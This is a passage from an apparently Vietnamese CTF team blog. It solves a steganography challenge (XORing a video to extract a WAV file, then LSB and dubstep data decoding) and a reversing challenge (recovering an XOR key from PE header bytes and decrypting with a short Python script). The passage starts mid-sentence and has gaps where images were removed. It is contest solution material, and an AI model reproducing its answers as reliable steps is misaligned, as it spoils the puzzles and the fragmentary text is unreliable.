đi của Sếp.Ngay khi nhìn vào dung lượng của tập tin mp4, thì mình biết chắc chắn rằng nó đang giấu một file gì đó.Mở f...", "content": "ChayngaydiTrong bài này ban tổ chức cho chúng ta đoạn teaser trailer Chạy ngay đi của Sếp.Ngay khi nhìn vào dung lượng của tập tin mp4, thì mình biết chắc chắn rằng nó đang giấu một file gì đó.Mở file mp4 bằng binwalk hay foremost cũng không thấy gì khác biệt, nên mình đành làm nước cuối cùng đó là tải luôn đoạn teaser của Sếp về để xor, và ngay lập tức mình có được file wav đã bị đổi header. Và nó bị đổi header thì chúng ta phải sửa lại cho đúngtừthànhsau khi có được file wav, trong lúc thi mình có nghĩ đến kĩ thuật lsb và đã sử dụng wavesteg để lấy flag nhưng đáng buồn là mình chỉ sử dụng 1 lsb để decode và ra được 1 nữa flag.Cho đến lúc chiều khi ban tổ chức có hint là ack mình vẫn không biết đó là kĩ thuật gì. Sau khi cuộc thi kết thúc mình có hỏi và được mấy anh trong Zepto team thì mới biết đó là kĩ thuật dubstep data encoding, một kĩ thuật rất mới ( mình từng có lướt qua twitter của DEFCON và thấy kĩ thuật này nhưng hình như lúc đó đang cày quest book TI8 nên bỏ qua luôn thì phải 😭 ). Các bạn có thể tham khảo kĩ thuật này tại đây.Sau khi follow theo bài viết của tác giả mình decode ra được đoạn hex:#####53656341743b0a0d3a230d03021f2b013a42091c310836065c2d012a121a1106154c0vẫn chưa phải là flag 😰.Ngẫm một hồi mình lại nhìn đến nửa flag mình đã tìm được trong lúc thi tìm thêm nhưng mảnh ghép ??? Hmm có khi nào là dùng nhiều lsb hơn? Mình đã thử dùng 2 lsb và cái kết:Mình ngớ người khi ra kết quả như vậy, thật sự là mình rất cay, bởi vì trong lúc thi mình quá mất bình tĩnh khi chỉ tìm được 1 nữa flag để rồi rối trí trong việc tìm 1 nữa còn lại. 😐Cập nhật 29/05/2018: Sau khi mình viết bài này thì được tác giả của bài góp ý rằng flag của lsb chưa đúng định dạng và flag là xor(lsb,ack) nên mình đã làm lại và xor 2 đoạn trên thì mình đã ra được flag chính xác:A huge thank to the changllenge’s author 👍Thông tin quan trọng: Trong tầm tháng 6 hoặc 7 đội mình sẽ tổ chức 1 giải CTF với mục đích giao lưu rất mong nhận được sự tham gia của các bạn. 👍Decrypted file“Bài này mình viết lại theo solution của anh Nhật Hoàng, một thành viên khác trong đội. Mình chỉ đóng góp phần resize file bmp để ra được flag. “Đề bài chúng ta có 1 file exe dùng để mã hoá và 1 file bị mã hoá. Dùng IDA để xem nó hoạt động như thế nàoMình ko biết hàm sub_4010A0 làm gì nên bỏ qua việc phân tích. Giờ đến hàm chính của bài đó là hàm sub_4017D0.Ta thấy rằng bài này chủ yếu là phép xor giữa file mình nhập vào và file key. Và nếu gặp byte null thì giữ nguyên không xor.Mình thấy ý tưởng bài này khá giống bài ransomware trên reversing.kr nên mình đoán ràng file bị mã hóa là file PE. Trong file PE thì có 1 đoạn là mặc định luôn luôn có:Nên mình lấy đoạn này trong file PE khác xor vs file bị mã hóa =&gt; key Mình thấy key là 1 đoạn hex =&gt;Thấy rằng đoạn hex được lặp lại =&gt; cái này là key = #####5c7ab41e37efc4e816ebfcbc70071aa2Dùng key để giải file bị mã hóaMình làm đến đoạn này tưởng rằng đã xong nhưng mà file PE sau khi giải chạy ko được.Ngồi cả buổi để fix lỗi cho file đó chạy nhưng vẫn không thành công. Về làm lại và được hint từ ban tổ chức thì file đó chạy ko được nhưng sử dụng CFF explorer thì có thấy 1 file bitmapsVà để đọc được file bmp này thì cần phải resize lại cho đúng với độ phân giải. Mình dùng 010 editor và sau nhiều lần thử thì tăng chiều rộng lên 2 lần và giảm chiều cao 2 lần sẽ ra được flag:Code tìm key và decrypt file, các bạn tham khảo:f = open('dec.exe','rb').read()g = open('file','rb').read()k = open('flag.exe','wb')#find keydata = f[78:78+40]print datadata1 = g[78:78+40]s = ''for i in range(len(data)): s += chr(ord(data[i])^ord(data1[i]))print s # key = 32# =&gt;bat dau cua key la vi tri thu 96 ma ta lay data tu vi tri 78 =&gt; 78+18 la vi tri bat dau cua key# decrypt files = ''key = '5c7ab41e37efc4e816ebfcbc70071aa2'for i in range(len(g)): if ord(g[i])!= 0: s += chr(ord(g[i])^ord(key[i%len(key)])) else: s += g[i]k.write(s)k.close()print 'solve !!!!!!'" } ]
